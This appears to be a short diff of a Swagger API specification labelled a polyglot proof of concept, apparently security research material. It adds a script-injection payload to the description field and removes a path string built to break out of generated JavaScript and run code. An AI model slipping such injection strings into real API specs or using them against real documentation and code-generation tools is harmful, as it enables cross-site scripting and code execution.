@@ -6,9 +6,9 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: Swagger Polyglot PoC
-  description: Please Click Authorize!
+  description: <script>alert(1)</script>
 paths:
-  "/a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array(":
+  "/a":
     get:
       responses:
         200:
